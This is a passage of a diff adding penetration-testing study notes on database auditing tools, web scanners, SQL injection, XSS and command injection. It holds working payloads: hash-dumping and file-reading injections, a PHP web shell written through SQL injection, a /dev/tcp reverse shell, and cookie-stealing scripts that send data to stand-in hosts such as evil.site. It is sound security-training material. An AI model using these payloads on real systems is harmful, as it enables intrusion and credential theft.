+	echo '#                                                       #'
+	echo '#########################################################'
+	echo
+	echo version info for SQL Auditing Tools
+	${TRGDIR}/bin/tsql
+	${TRGDIR}/bin/sqlquery	
+
+More SQLAT:
+	sqlanlz - Does a minimal analysis of the server. Fetching
+          information about databases, users, extended stored
+          procedures and other relevant information. The output
+          is in HTML.
+	sqldict - Does a dictionary attack on the user(s) specified.
+	sqldirtree - Outputs an ASCII directory tree of the base dir
+             you specify.
+	sqldumplogins - Dump all logins from server.
+	sqlquery - Interactive query tool.
+	sqlregenumkey - Enumerate keys from the registry.
+	sqlreggetvalue - Get value from specific registry key.
+	sqlsamdump - Dump the SAM from a SQL Server. (requires pwdump2)
+	sqlupload - Upload files to a SQL Server.
+		Most of the tools can *only* be run as 'sa'. This usually isn't a
+		problem though.
+
+
+*********************
+Oracle
+*********************
+
+TNSLSNR - verifies the existence of the Oracle listener on a server
+	Windows Client:
+		http://dokfleed.net/files/audit/OracleTNSLSNR.exe
+			Commands Supported:
+				ping, version, service, status change_password,help, reload,
+				save_config, set connect_timout, set display_mode, set log_directory, 
+				set log_file, set log_status, show, spawn stop 
+	Perl Version:
+		/usr/local/bin/tnscmd.pl
+			Command Supported:
+				ping, version, service, status change_password,help, reload,
+				save_config, set connect_timout, set display_mode, set log_directory, 
+				set log_file, set log_status, show, spawn stop 
+		Can also be aquired from:
+			http://dokfleed.net/files/audit/tnscmd2.zip
+	10G Perl Version:
+		http://dokfleed.net/files/audit/tnscmd10g.zip
+			copy to /usr/local/bin after download
+
+Oracle Auditing Tools - a collection of tools that can be used for pen testing of an Oracle DB
+	Both Windows and Linux versions exist of the following tools
+	Use the following command to aquire the SIDs:
+		sh /pentest/database/oracle/oat/otnsctl.sh -s 10.1.1.1 -P 1521 -c status
+			-s   Server name or IP address
+			-P   Port number (usually 1521)
+			-c   Command (ping, version, services, status)
+			-I   Interactive mode
+			-v   Verbose output
+		Can also be aquired from:
+			http://www.cqure.net/tools/oat-binary-1.3.1.zip
+
+	Use the following command to enumerate Users in the Oracle DB
+		Modify the oscanner.sh file and include the path to java (i.e. /usr/bin/java)
+		sh /pentest/database/oracle/oscanner_bin/oscanner.sh -s 10.1.1.1
+			-s   Server name or IP address
+			-P   Port number
+			-f   server list, for scannng multiple server
+			-v   verbose output
+
+	OScanner Report Viewer:
+		OScanner automatically creates a report that this Report Viewer can open
+		The Accounts in the report that have a red X next to them are accounts that are
+			unlocked and in the default configuration or using well-known passwords.
+			i.e sys account has the password 'sys'
+		Modify the reportviewer.sh file and include the path to java (i.e. /usr/bin/java)
+		sh /pentest/database/oracle/oscanner_bin/reportviewer.sh 10.1.1.1
+
+
+Oracle Enterprise Manager Console - download from oracle.com
+	Select Tools | Database Applications | SQL*Plus Worksheet
+		File | Change Database Connection
+			Use the account and password for SYS
+		Dump the user name and password hashes:
+			select name,password from sys.user$ where type#=1;
+			Crack the passwords using a tool called orabf
+				http://www.tool-crypt.org/tools/orabf/index.html
+
+
+
+********************************************************************************************************
+Web Server / Web App Testing
+********************************************************************************************************
+Qualys offers a free Security Assessment of your web site, for small and medium sized businesses:
+	https://freescan.qualys.com/freescan-front/
+
+OWASP Tools Install on Ubuntu in the cloud:
+	echo "deb http://archive.canonical.com/ubuntu precise partner" >> /etc/apt/sources.list	echo "deb http://appseclive.org/apt/stable /" >> /etc/apt/sources.list	apt-get update
+	#apt-get --assume-yes --force-yes install xbuntu-desktop
+	apt-get --assume-yes --force-yes install owasp-wte-cloud
+	#useradd --comment "OWASP WTE" --create-home owasp 
+	# echo -e "owasp\nowasp" | passwd owasp	# service lightdm start
+
+
+HTTP/1.1 is defined in RFC 2616
+	http://tools.ietf.org/html/rfc2616
+
+HTTP Response Codes:
+	1xx Informational 	-100 Continue
+	2xx Success		-200 OK
+	3xx Redirection		-302 Redirect
+				-304 Not Modified
+	4xx Client Error	-401 Unauthorized - must authenticate
+				-403 Forbidden - web server doesn't have permis
+				-404 File not found
+	5xx Server Error	-500 Server Error
+				-502 Bad Gateway
+
+Supported HTTP Request Methods
+	PUT 	-WebDAV method that allows files to be PUT onto the server
+	DELETE	-Allows for removing files
+	CONNECT	-Creates a TCP Tunnel through the server in the HTTP Protocol
+	TRACE	-Echo the request as seen by the server
+	OPTIONS	-List supported methods
+
+	for method in GET POST PUT TRACE CONNECT OPTIONS;
+	do
+		printf "$method / HTTP/1.1\nHost: site.com\n\n" | nc site.com 80
+	done
+
+
+nikto	web site scanner
+	/pentest/scanners/nikto/nikto.pl -update
+	/pentest/scanners/nikto/nikto.pl -host www.mysite.com -C all
+		-id   this flag allows you to pass "basic" authentication credentials
+		To get nikto to run within Nessus it must be in the path before the nessus daemon starts
+		up.  export PATH=$PATH:/usr/local/nikto:/pentest/scanners/nikto && nessusd -D
+	nikto.pl -host 192.168.1.100 -root /~user mutate 1
+		-root /~user 	--tells nikto to use that directory as the root directory
+		mutate 1	--tells nikto to guess additional file names
+	nikto.pl -host www.sec542.org -C all -Format HTM -output nikto.html
+		Creates HTML report of scan 
+	nikto.pl -C all -mutate 1 -Plugins @@ALL -host www.mysite.com
+		-C all		Scan all CGI Directories
+		-mutate 1	Combine tests - Tests all files with all root directories
+		-Plugins @@ALL	Select which plugins will be run
+		-host		host to scan
+
+nikto
+   -T	Test Categories
+		0	File Upload
+		1	Interesting File / Seen in logs
+		2	Misconfiguration / Default file
+		3	Information Disclosure
+		4	Injection (XSS/Script/HTML)
+		5	Remote File Retrieval, in web server root directory
+		6	Denial of Service, without launching DoS attack
+		7	Remote File Retrieval - Server Wide
+		8	Command Execution / Remote Shell
+		9	SQL Injection
+		a	Authentication Bypass
+		b	Software Identification
+		x	Reverse Tuning Options
+
+	./nikto.pl -h 1.1.1.1 -T 48
+		This would look for web resources on 1.1.1.1 that had flaws
+		associated with (4) Injection and (8) Command Execution
+
+	./nikto.pl -Single
+		This allows you to compose and HTTP request manually and send
+		it to a target and view the response comming back.  XSS, If the 
+		exact same response, compared to the request, comes back it is 
+		vulnerable to XSS
+
+	Integrate Nikto with Nessus:
+		http://blog.tenablesecurity.com/2008/09/using-nessus-to.html
+
+
+niktorat	http://niktorat.sourceforge.net/ 	
+		Niktorat parses a plaintext Nikto report and outputs a series of navigable web pages for
+		each finding with vulnerability information, HTTP request and response headers, and HTML
+		dumps of the vulnerability URLs.
+
+
+skipfish	A fully automated, active web application security reconnaissance tool
+		http://code.google.com/p/skipfish/
+
+
+telnet 		Use telnet for Intelligence Gathering; force web server to return error message
+    telnet www.mysite.com 80
+	HEAD / HTTP/1.0
+    telnet www.mysite.com 80
+	GET /no_such_page_exists HTTP/1.0
+
+
+hmap		Tool for fingerpinting web servers
+		http://ujeni.murkyroc.com/hmap
+	/pentest/web/w3af/plugins/discovery/hmap.py -c 3 www.mysite.com:80
+		-c 3	limit the number of guesses
+
+httprint -h 192.208.27.4 -s /pentest/enumeration/www/httprint/linux/signatures.txt
+	see section above
+
+openssl		Use Openssl to talk to ssl ports and gather information
+   openssl
+	OpenSSL> s_client -connect www.mysite.com:443
+	HEAD / HTTP/1.0
+
+   openssl s_client -connect 1.1.1.1:443 -ssl2	
+	#tests to see if the webserver supports ssl version 2
+		you should only allow TLSv1.x or SSLv3 on websites	
+	openssl s_client -cipher enull -connect 1.1.1.1:443
+		#This sends an SSL Hello claiming SSLv2 and v3 with only the set of null ciphers 
+	   	available.
+	openssl s_client -connect www.sans.org:443 -ssl2
+	openssl s_client -connect www.sans.org:443 -cipher NULL
+
+SSLScan		-Shows all supported ciphers and ssl version
+		./sslscan --no-failed www.mysite.com
+
+THC SSL Check	-Shows all supported ciphers and ssl versions
+		wine THCSSLcheck.exe www.sec542.org 443
+
+SSLDigger	-Grades SSL ciphers and strengths
+
+WPScan 		-Wordpress Security Scanner
+		 http://code.google.com/p/wpscan/
+		 Install:
+			apt-get install libcurl4-gnutls-dev
+			gem install --user-install mime-types typhus xml-simple
+			svn checkout http://wpscan.googlecode.com/svn/trunk/ ./wpscan 
+			
+		Execute:
+			cd wpscan/trunk
+			./wpscan.rb --url globosferro.org --enumerate p
+
+netcat
+	printf "GET / HTTP/1.0\n\n" |nc -v www.site.com 80
+			-w 3  -wait 3 seconds then drop if no connection
+	nc -v www.site.com 80
+	OPTIONS / HTTP/1.0
+
+	TRACE / HTTP/1.0
+	 HOST: anything.com
+	 X-Header: mytrace
+		# The HTTP TRACE method is designed for debugging and is enabled by default 
+		# on most Web Servers.  A trace request set from a browser to a web server
+		# will include all headers (e.g., cookies) that are valid for that web 
+		# server domain, and these cookies will appear in the "echo" that is 
+		# returned to the browser.  By doing the above if it gets "echoed" back
+		# to the browser than you know that TRACE is enabled
+
+	HEAD / HTTP/1.0
+
+	If OPTIONs returns support for PUT try:
+  	  nc -v www.site.com 80
+	  PUT /test HTTP/1.0	# /test is the name of the file to create
+	  this is a test	# this is the content to put in the file
+	  <CRLF>
+	  <CRLF>
+
+	DELETE /file.html HTTP/1.0
+	<CRLF>
+
+Wapiti		- It performs "black-box" scans, i.e. it does not study the source code of the 
+		  application but will scan the webpages of the deployed webapp, looking for 
+		  scripts and forms where it can inject data.  Once it gets this list, Wapiti 
+		  acts like a fuzzer, injecting payloads to see if a script is vulnerable.
+		cd /pentest/web/wapiti/	
+		python wapiti.py http://www.yoursite.com 
+		python wapiti.py http://www.yoursite.com -c <cookie_file> 
+
+DirBuster	- designed to brute force directories and files names on web/application 
+		  servers. Often is the case now of what looks like a web server in a state of 
+		  default installation is actually not, and has pages and applications hidden 
+		  within. DirBuster attempts to find these.  You must select a "dir list" file
+
+Grendel-Scan	- The Nessus of Web App Scanners - must have for web app pen test!
+		  http://grendel-scan.com
+		  web application security testing tool. It has automated testing module for 
+		  detecting common web application vulnerabilities.  Grendel will also set up 
+		  a wizard to help you determine the "login form" that is used to authenticate
+		  a user.  This can then be used in Nessus and other tools.
+		  http://grendel-scan.com/download.htm
+
+W3AF 		- Metasploit for Web apps;  Vulnerability tester, Request fuzzer and Interceptor
+		  Finds vulnerabilities and allows you to exploit them within the app
+		  Homepage: http://w3af.sourceforge.net/ 
+		  Movies! http://w3af.sourceforge.net/videos/video-demos.php 
+		  Plugins at a minimum:
+			Audit:
+				osCommanding
+				sqli
+				sslCertificate
+				unSSL
+			Discovery:
+				serverHeader
+				allowedMethods
+				phpEggs
+				webSpider
+			Ouput:
+				gtkOutput
+				htmlFile
+		  Plugins for a more thorough scan:
+			Audit:
+				Select All
+			Discovery:		-Add more as needed
+				allowedMethods
+				findBackdoor
+				phpEggs
+				phpinfo
+				robotsReader
+				serverHeader
+				webSpider
+			grep:			-Seems to make W3AF crash
+				Select All
+			mangle:
+				Select All
+
+
+jbrofuzz	- it allows for the identification of certain classess of security 
+		  vulnerabilities, by means of creating malformed data and having the 
+		  server/service in question consume the data. 
+		  For web pentesting click the web directories tab and add any directories to
+			test to the "Total Directories to test:" list.  Click Start
+
+Samauri	- live CD for web application security testing	
+	http://sourceforge.net/projects/samurai
+	http://samurai.inguardians.com
+	http://www.madirish.net/?article=218
+
+Live HTTP Headers	Plugin for Mozilla-based browsers that allows you to examine the last
+		request submitted in your browser...and then modify/replay it
+		http://livehttpheaders.mozdev.org/installation.html
+
+Firefox Extensions:
+	Firebug		-Great for Hidden Fields, Breckinf forms, Messing with Java Script
+	YSlow		-Requires Firebug - gives you time and breakdown of components
+	TestGen4Web	-Allows record and playback, modify recordings, etc
+
+Proxy's		All HTTP and HTTPS data between server and client, including cookies and form fields,
+		can be intercepted and modified
+	Paros	http://www.parosproxy.org
+		Start Paros - set browser to localhost port 8080
+		  Trap 	This tab allows you to trap the request before it is submitted to the server by
+			checking the "Trap Request" checkbox.  You now have the ability to edit the 
+			request in Paros before submitting it to the server.  Click "Continue" to submit
+			the request to the server.  If "Trap Request" is still checked subsequent 
+			requests will still pause awaiting release.  After making a change you should
+			uncheck "Trap Reuest" to let the remaing requests pass unhindered.
+	 	  URL	Right click the URL on the sites tab and click Spider    
+		  	Hightlight the URL on the left and click Analyse -> Scan
+		  History Window - Right click the POST line and click "Scan for History"
+		  Other Settings:
+			Tools -> Options -> Authentication --lets you set authentication credentials
+				NTLM is not strongly supported
+			Tools -> Options -> View --enables the viewing of images in HTTP requests
+			Tools -> Options -> Trap --can be used to preset URL's that the proxy should
+				intercept before permitting traffic to pass
+						
+	WebScarab	http://www.owasp.org/index.php/Category:OWASP_Project
+		Start WebScarab - set browser to localhost port 8008
+			The Summary tab will show you possible injection points in the web app you are
+			browsing
+			Proxy Tab - Miscellaneous Tab - Reveal hidden fields in HTML pages!!!
+		  
+	BurpSuite
+		Proxy		-Intercepts and allows manipulation of HTTP(S) 
+				connections between attack browser and app
+		Spider		-crawls a web app
+		Intruder	-attack tool
+		Repeater	-allows manipulation and repeating of interactions/
+				attacks
+		Sequencer	-Analyzes session tokens for predictability, thus
+				the relative security against session synthesis/
+				hijacking
+		Decoder		-manual or intelligent decoding of various encoding
+				schemes
+		Comparer	-a form of "diff", providing differences between
+				two items of text
+		
+
+Web Site Spidering:
+	WebScarab 
+	Burp Suite
+	Paros
+	wget -r http://site.org --no-check-certificate
+		Scrape all content from the downloaded web files and create a dictionary file used to
+			attack logins on the web site.  cat *.html |sort |uniq > dictionary.txt
+
+yokoso!		Browser script that looks to see if a given browser has been
+		used to manage infrastructure stuff
+
+durzosploit	-encoding attack browser scripts
+
+
+SQL Injection:
+	SQL Injection Characters:
+		' or " 		Character String Indicators
+		-- or #		Single line Comment
+		/*...*/		Multi-line Comment
+		+		Addition, concatenate (or space in a url)
+		-		subtracation
+		=		Equality operator
+		<>!=		Inequality operators
+		><		Greater than and less than operators
+		()		Expression or hierarchy delimitor
+		||		(double pip) concatenate in Oracle and Postgres
+		%		wildcard attribute indicator
+		,		list item separator
+		@, @@		Local and Global variable indicators
+		.		Identifer qualifer seperator
+		PRINT		Useful as non transactional command
+		@variable	Local Variable
+		@@variable	Global Variable
+		waitfor delay '0:0:10'	time delay
+
+	Difference between Databases:
+			MS Sql		MySQL		Access		Oracle		Postgres
+	Concatenate	''+''		concat		""&""		''||''		''||''
+	strings				("","")
+	
+	Null		isnull()	ifnull()	iff(isnull())	ifnull()	COALESCE()
+	replace
+
+	Position	CHARINDEX	LOCATE()	InStr()		InStr()		TEXTPOS()
+
+	Op Sys		xp_cmdshell	select into	#date#		utf_file	Call
+	Interaction			outfile /
+					dumpfile
+
+	Cast		Yes		No		No		No		Yes
+
+	Union		Yes		Yes		Yes		Yes		Yes
+
+	Subselects	Yes		Yes 4.1+	No		Yes		Yes
+
+	Batch Queries	Yes		No		No		No		Yes
+
+	Default Stored	Yes		No		No		Yes		No
+	Procedures
+
+	Linking DBs	Yes		Yes		No		Yes		No
+
+
+	Finding out User Privilege Level:
+		user
+		current_user
+		session_user
+		system_user
+
+		' and 1=user --
+		'; if user ='dbo' waitfor dely '0:0:5' --
+		' union select if ( user() like 'root@%', benchmark(50000,sha1('test')),'false');
+
+	Retrieving a Password Hash:
+		Oracle:	`union all select 1,1,username,password from dba_users where `'=`
+
+		MySQL:	`union all select User,Password,'text','text' from mysql.user where `'=`
+
+		MSSQL:	`union all select name,password,`text',1 from syslogins where `'=`
+			`union all select name,password,`text',1 from sysxlogins where `'=`
+
+		Read/Write Local files Using SQL Injection:
+			MySQL:	' union select load_file('/etc/passwd'),1 #
+
+			MSSQL:	BULK INSERT temp FROM 'C:\test' --
+	
+			Oracle:	UTL_
+
+
+	Example MSSQL injection with OS Interacation:
+		'; exec master.xp_cmdshell 'netstat -an > temp.txt' --
+		'; CREATE TABLE tmp (txt varchar(8000));
+		   BULK INSERT tmp FROM 'temp.txt'
+		      with (rowterminator = "\n\n\n\n")--
+		'and 1 in (select txt from tmp) --
+		'; drop table tmp--
+
+
+	Example SQL Injection:
+	    30000' select name from sysobjects--
+	    30000' select name from syscolumns--
+	    30000' exec sp_makewebtask '
+	    30000' ; exec xp_cmdshell --
+	    30000' having 1=1--
+
+	SQL Injection cheat sheet:
+		http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/
+
+	Errors:
+		Oracle	-Always starts with ORA-0xxx"
+		MS SQL	-Incorrect Syntax near `
+		MySQL	-You have an error in your SQL syntax
+
+	Standard SQL Commands:
+	   Select to retrieve records:
+		select chrName, chrPhone from tblUsers;
+	   insert to add records to a database:
+		insert into "tblUsers" (chrName, chrPhone) values ("jim", "303");
+	   update to modify existing records:
+		update <tablename> set <columnname> = "<newdata>" where <columnname> = <value>;
+		update tblUsers set chrPhone = "303-123-4567" where chrName = "Kevin";
+	   To update multiple columns:
+		update <tablename> set <columnname> = "<newdata>", <columnname> = "<newdata>" where <columnname> = <value>;
+		update tblUsers set chrPhone = "303-123-4567", charity = "Tulsa" where chrNmae = "Kevin";
+
+	SELECT		-Query the data and return the results
+			 SELECT * FROM table INTO dumpfile '/result.txt';
+	CREATE		-Create some db object liek a record, tables, stored-
+			 procedures, etc...
+	UPDATE		-Update an existing database object (such as a record)
+	DROP		-Delete data (drop user_table;)
+	SHUTDOWN	-stop the server
+	AND		-logical joining of two part of a query
+	OR		-logical joining of two parts of a query
+	UNION		-join the results of two queries (number of fields must
+			 be equal
+			 ' union select load_file ('/etc/shadow'),1 #
+	INSERT		-Insert Data into DB
+			 You don't know the db schema so you need to guess the
+			 number of fields:
+				foo');--
+				foo',1)--
+				foo',1,1);--
+	;		-finish the sql statment - and possibly start another 
+				; shutdown;--
+	--		-comment delimiter for some databases (not all).  Often
+			 used to "get rid of the rest of a canned SQL query...
+	IF		-conditional statement - helpful in blind SQL injection
+	SUBSTRING	-Select a part of the string - helpful in blind SQL
+			 injections	
+	WAITFOR		-Cause a time delay
+
+	' or ''='' or''='		#SQL Injection for Login and Password field
+	' or '1=1''			#Put in both the login and Password field
+	1<2 and "Brenna"="Brenna"	#other injections that are always true
+
+
+	Useful SQL Elements that indicate a comment:
+		--
+		#
+		/* 
+	Values of OR TRUE:
+		' or 1=1
+		" or 1=1
+		' or 'a' = 'a
+		') or ('a'=a
+	select * from inventory where sku='' or 1=1--';
+
+	Additional SQL Elements
+	;	support for multiple queries...just like bash
+
+	Union	take the results of two searches and merge them in to one set
+		of results.  
+		select * from inventory where sku='' UNION select * from users
+			where 1=1;--';
+		
+		select * from inventory where sku='' UNION select (name, id, 1
+			, 1, 1) from users where 1=1;--';
+
+		UNION select statments must have the same number of columns or
+			they will error out.  by using a *,1 we can pad columns
+			so that they end up matching
+			" union select *,1 from accounts /*
+
+	MS SQL
+		select name from master..sysobjects where xtype ='U';
+		select top 1 table_name from information_schema.tables;
+
+	Oracle
+		select table_name from user_tables;
+	
+	MySQL
+		select table_schema,table_name from infromation_schema.tables;
+
+SQL Injection Cheat Sheet
+	http://pentestmonkey.net
+
+SQL Injection to perform Command Injection
+	MS SQL
+		exec master..xp_cmdshell 'ping [attackerIP]' --
+
+		exec master..sp_makewebtask \\[attaterIP]\share\results.html, "
+			select * from information_schema.tables"
+
+	MySQL
+		and 1=0 union select '[PHP code]' INTO OUTFILE 
+			'/var/www/html/mycode.php'
+
+Guessing letters in the table name via Blind SQL Injection
+	and substring((select top 1 name from master..sysobjects where xtype='
+		U'),1,1)>'m'
+			This askes if the first letter is m, keep trying until
+			you get the correct letter.
+			Then change to 2,1 and try again to get the 2nd letter
+			then change to 3,1 and try again, etc, etc
+
+Example SQL Injection on a PHP site with MySQL backend:
+	"
+	" or 1=1 /*		We learned that there are 6 colums
+	" union select * from accounts /*
+	" union select *,1 from accounts /*	We pad with 1's until we get 6
+	" union select "hello world", "", "", "", "", "" /*
+	" union select "<?php system(\"ping -c 4 1.1.1.1\");", "", "", "", "",
+		"" into outfile "/var/www/html/haxor.php" /*
+			This creates a file that you can access on the website
+			that will ping your IP 1.1.1.1; http://site/haxor.php
+	" union select "<?php if (isset($_REQUEST['cmd'])){ echo '<pre>'; system($_REQUEST['cmd']); echo '</pre>'; } ?><form action=<?php echo basename($_SERVER['PHP_SELF'])?>> <input type=text name=cmd size=20> <input type=submit></form>","","","","","" into outfile "/var/www/html/haxor2.php" /*
+		This is a command injection page that will let you execute any
+			command you want.  Access http://site/haxor2.php
+
+
+	OS Interaction via SQL injection on MS SQL
+		'; exec master.xp_cmdshell 'route print > results.txt' --
+		'; Create TABLE results (outp varchar(5000)); --
+		'; BULK INSERT results FROM 'results.txt' with (rowterminator= "\n\n\n\n"); --
+		' and 1 in (select outp from results) --
+
+	Enable xp_cmdshell if it is disabled
+		EXEC sp_configure 'show advanced options', 1;
+		RECONFIGURE;
+		EXEC sp_configure 'xp_cmdshell', 1;
+		RECONFIGURE;
+
+	SQL Inject Me	Plugin for Firefox to SQL Inject one input field, or all the 
+		forms on the page.  It currently only tests against form fields
+		This is great for testing forms on web pages for SQL Injection!
+
+	Blind SQL Injection Examples:
+		index.php?itemid=9	Returns data about a specific item #9
+		index.php?itemid='	Returns no item found message
+		index.php?itemid=9' and 1=1; --	  Returns data about item #9
+		index.php?itemid=9' and 1=0; --   Returns a no item found message
+
+	SQLMap		Tool for Blind and Normal SQL injection.  Will provide an OS
+			Shell.  It is a part of w3af
+
+	Absinthe	Blind and Normal SQL injection tool
+
+  
+
+Javascript Injection Examples:
+	javascript:alert(document.cookie);
+	javascript:void(document.cookie="Field = myValue");
+
+
+Command Injection:
+	For example:
+		Use command injection to get a remote bash session
+		Attacker starts nectar listener
+			nc -n -v -l -p 2222
+		Then in the user input form enter the following
+			test; /bin/bash -i > /dev/tcp/<ip of nc>/2222 0<&1 2>&1; echo hello
+				test;		data that the input form would normally use;
+						i.e. username, password, etc
+				/bin/bash -i	invoke bash in interactive mode
+				> /dev/tcp	redirect output of bash to ip on port 2222 via
+						/dev/tcp.  There is a / between ip and port
+				0<&1		tells the system to duplicate the standard
+						output file descriptor (&1) and connect it to
+						the standard in of bash
+				2>&1		standard error
+				;echo hello	Just acting as a place holder in case the 1st
+						two command don't actually work.  If you notice
+						the 3rd command works but the other 2nd didn't
+						you can compose your injection so the 3rd one
+						will work...if necessary
+
+
+Cookies
+	Cookies involve the use of HTTP header responses to set values on the client side, and 
+	in client requests to provide these values back to the server side. The value is set using 
+	a 'Set-Cookie' header and returned using a 'Cookie' header. Take the following example of 
+	an exchange of cookies. The client requests a resource, and receives in the headers of the 
+	response:
+
+	Set-Cookie: PASSWORD=g0d; path=/; expires=Friday, 20-Jul-03 23:23:23 GMT
+
+	When the client requests a resource in path "/" on this server, it sends:
+
+	Cookie: PASSWORD=g0d 
+
+Session ID's
+	Most modern web scripting languages include mechanisms to maintain session state. That 
+	is, the ability to establish variables such as access rights and localization settings 
+	which will apply to every interaction a user has with the web application until they 
+	terminate their session. This is achieved by the web server issuing a pseudo-unique 
+	string to the client known as a Session ID. 
+		
+	Session ID's using GET variable:
+	PHP supports GET variable sessions - the Session ID is passed via a GET variable named
+		PHPSESSID.  PHP automatically modifies all links at runtime to add the PHPESSID
+		to the link URL, thereby persisting state.  Not only is this vulnerable to 
+		replay attacks it trivializes it -- searching proxy logs, viewing browser
+		history, etc
+
+	Session ID's using Cookies:
+	ASP uses 'Session-ID' where PHP uses 'PHPSESSID' in the cookie method variable.  The 
+		Session Id can still be logged and replayed.  The attacker need only post the 
+		document.cookie property to his logging application to extract the Session ID.
+
+	Session ID's using Hidden Forms:
+	One technique often used is to embed the Session ID string in an <input type="hidden"> tag
+	with a <form> element.
+
+XSS - Cross Site Scripting
+    <script>alert("Gotcha")</script>
+    <script>alert(document.cookie)</script>
+    </Title><script>alert('Gotcha')</script>
+	Put another web site in an iframe:
+		<iframe src="http://www.cnn.com"</iframe>
+
+	http://vulnerablesite.com/index.learn?action=%3C/TITLE%3E%3Cscript%20src=%22http://myevilsite.com/test.js%22%3E
+		test.js contents:
+			alert("XSS")
+
+
+    document.write('<img src='http://myevilsite.com?' + document.cookie + '>');
+ 	This takes the cookie already loaded in my browser and sends it to the "myevilsite.com" 
+	as an image request.
+
+	A simple example of XSS can be seen in the following URL:
+		http://server.example.com/browse.cfm?categoryID=1&name=Books
+
+	In this example the content of the 'name' parameter is displayed on the returned page. 
+	A user could submit the following request:
+		http://server.example.com/browse.cfm?categoryID=1&name=<h1>Books
+
+	If the characters < > are not being correctly stripped or escaped by this application, 
+	the "<h1>" would be returned within the page and would be parsed by the browser as 
+	valid html. 
+	A better example would be as follows:
+		http://server.example.com/browse.cfm?categoryID=1&name=<script>alert(document.cookie);</script>
+
+	In this case, we have managed to inject Javascript into the resulting page. The relevant 
+	cookie (if any) for this session would be displayed in a popup box upon submitting this 
+	request. 
+
+	Excellent XSS resource: http://ha.ckers.org/xss.html
+
+	Two types of XSS:
+		Reflective - request contains XSS input, which is directly reflected back at victims browser
+		Stored or Persistent - XSS input sent to target, which stores it as content...later, this content 
+			is accessed by a victim's browser
+		Reflective:		
+			Easiest to test
+			Place script in URL
+		Persistent:
+			Requires attacker to input script
+			Then view resulting page
+			For example:
+				Attacker starts netcat listener
+					nc -n -l -p 2222
+				Attacker Posts a message to a forum
+					<script>document.location='http://1.1.1.1:2222/grab.cgi?'+document.cookie;</script>
+						grab.cgi doesn't have to actually exist.  It just needs to be in URI
+				Victim Views the message 
+					Victims cookies are sent to 1.1.1.1 on port 2222
+
+	Tools for discovering XSS:
+		TamperData	Plugin for Firefox, plus allows you to mangle
+				packets
+		XSS Me		Plugin for firefox, form input testing much like
+				SQL Inject Me
+		GreaseMoneky	Plugin for Firefox
+		Burp Suite	Interception Proxy
+
+	XSS Example in a Message Board
+		<B C=">" onmouseover="alert('Gotcha!')" X="<B ">H E L L O</B>
+			or
+		<B C=">" onmouseover="alert(document.location='http://mysite.org/cookiecatcher.php?'+document.cookie)" X="<B ">H E L L O</B>
+			The code for the php script called cookiecatcher.php.  If it is
+			running you can look in /tmp/cookiedump and see the cookie
+
+	XSS Example in url:
+		www.site.org/index.php?lang=<script>alert('XSS!')</script>
+			or
+		www.site.org/index.php?lang=<script>var lo=document.location;document.location='//myevilsite.org/cookiecatcher.php?'%2bdocument.cookie;var la = new Array();la = lo.toString().split('?');document.location=la[0];</script>
+			This script begins by taking note of the current location being 
+			displayed in the browser.  It then changesthe location to our 
+			cookiecatcher.php script and dumps up any cookies it can find.  
+			Finally, it breaks apart the text string representing the URL of 
+			our original page, removes our XSS from the end of the URL and 
+			switches our location back there.
+
+
+
+
+After fuzzing - look for HTTP 500 status codes and use these for exploitation!
+
+Perl Script for finding Linux Accounts with web directory browsing "~jones":
+	#!/usr/bin/perl
+	use LWP;
+	$webserver = "http://www.sec542.org";
+	my $browser = LWP::UserAgent->new;
+	while(<>){
+		chop($_);
+		$lastname = $_;
+		for('a'..'z'){
+			$fullname = $_.$lastname;
+			$url =$webserver."/~".$fullname;
+			my $response = $browser->get($url);
+			if($response->is_success){
+				print "Found: ".$fullname." : (".$url.")\n";
+			}
+		}
+	}
+
+
+Python! ---Learn it!
+	Sample Python Program for retrieving the index.php file:
+		import httplib
+		conn = httplib.HTTPConnection ("www.sans.org")
+		url = "/index.php"
+		conn.request ("GET", url)
+		resp = conn.getresponse()
+
+
+		print resp.getheader("Set-Cookie")
+			This will print any cookies being set in this response
+
+	Sample Python Program for printing "Server", "Date" and Cookie Headers
+		as well as writing response codes for valid "ID's" to a 
+		"results.txt" file:
+	
+		#!/usr/bin/python
+
+		import httplib
+		
+		n = 1
+		outfile=open(results.txt","a")   #the a will append
+		
+		while n <=100:
+			conn = httplib.HTTPConnection("www.site.com")
+			url = "/python/index.php?id=" + str(n)
+			conn.request("GET",url)
+			resp = conn.getresponse()
+			print resp.getheader("Server")
+			print resp.getheader("Date")
+			print resp.getheader("Cookie")
+			respcode=resp.status
+			result="\nTrying "+str(n)+"\n"+url+" "+str(respcode)+"\n"
+			outfile.write(result)
+			n+=1
+
+Code to steal cookies:
+	<script>document.write('
+	   <img src="http://evil.site/'+document.cookie+'">')
+	   </script>
+
+Code to redirect a user
+	<script language="javascript">
+	 window.location.href = "otherpage.html" ;
+	 </script>
+
+Code to change the Form Action to have it submit to us:
+	documnet.forms[1].action="http://www.sec542.org/"
+
+Code to execute external Script:
+	<script src="http://evil.site/bad.js">
+	  </script>
+
+Evasion Examples:
+	Traditional:
+		<SCRIPT>alert("XSS")</SCRIPT>
+			or
+		<IMG SRC="javascript:alert('XSS');">
+	Malformed
+		<IMG """><SCRIPT>alert("XSS")<SCRIPT>">
+		<IMG SRC=javascript:alert(&quot;XSS&quot;)>
+
+
+Business Logic Example:
+	Process should be: 
+ 	   Add item to cart; total the cart; Authorize Credit Card, Check out
+	BusinessLogic Attack:
+	   Total the cart; Authorize Credit Card, Add item to cart, Check out
+
+
+RatProxy	is a mostly passive scanner
+		Will decompile flash objects
+		http://code.google.com/p/ratproxy
+		./ratproxy -w ratproxy.log -v /output/ -d site.org -xtfscgX
+		./ratproxy-report.sh ratproxy.log > ratproxy.html
+			view ratproxy.html in browser
+
+Flare		is a Flash Decomiler allowing you to see the source code for a
+		flash app.
+		./flare video.swf	#usually kicks out some errors but works
+		vi video.flr
+
+
+SWFIntruder	Tool for analysis of Flash files - Better than Flare - it is
+		designed for security testing.  Shows injectable fields
+
+JAD		Java decompiler - convert class files back into source code.
+		View Page Source and find where the HTML calls the .class file
+			and download it with wget, etc.
+
+JD-GUI		Great Java decompiler for Mac
+		http://java.decompiler.free.fr/?q=jdgui
+
+JustDecompile	.NET decompiler for Windows 
+		http://www.telerik.com/download-trial-file.aspx?pid=845
+
+PHP		Various configuration options can change how PHP handles 
+		security and user input:
+			register_globals=[ON|OFF]
+				If set to on, application searches cookies,
+					GET, POST, and session variables
+				If set to off, variables must be explicitly 
+					referenced
+			display_errors=[ON|OFF]
+				Determines if PHP will display detailed error
+					messages to the browser
+				PHP Errors often contain sensitive info
+					Installed Path
+					Config Settings
+			allow_url_fopen=[ON|OFF]
